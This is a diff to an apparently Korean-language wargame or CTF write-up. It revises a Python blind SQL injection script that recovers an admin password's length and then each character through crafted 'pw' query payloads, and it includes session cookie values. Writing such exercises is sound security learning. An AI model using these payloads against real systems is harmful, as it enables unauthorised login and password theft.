@@ -27,7 +27,6 @@ substr(문자열, 시작위치, 길이) 와 같이 하면, 문자열을 시작�
 
 ```python
 import requests
-from bs4 import BeautifulSoup
 
 pw_length = 0
 pw = ''
@@ -37,8 +36,7 @@ cookies = {'PHPSESSID': '3t38beb14phghl6lep6f86ems4', '__cfduid': 'd242d1b31e55a
 # 쿠키는 개발자도구(F12)에 저장된 쿠키의 이름과 값을 딕셔너리로 가져옴
 
 for i in range(100):
-    soup = BeautifulSoup(requests.get(url + f"?pw=' or length(pw)={i} -- '", cookies=cookies).text, 'html.parser')
-    if soup.select('h2'):
+    if requests.get(url + f"?pw=' or length(pw)={i} -- '", cookies=cookies).text.count('Hello admin'):
         pw_length = i
         break
     else:
@@ -50,9 +48,7 @@ for i in range(1, pw_length+1):
 
     for j in possible:
         jj = "'" + j + "'" if ord(str(j)) > ord('a') else j
-        html = requests.get(url + f"?pw=' or id='admin' and substr(pw, {i}, 1)={jj} -- '", cookies=cookies).text
-        soup = BeautifulSoup(html, 'html.parser')
-        if soup.select('h2'):
+        if requests.get(url + f"?pw=' or id='admin' and substr(pw, {i}, 1)={jj} -- '", cookies=cookies).text.count('Hello admin'):
             print(f"#### 찾았다! {i}번째 위치의 비밀번호 문자 : {j}")
             pw += str(j)
             break
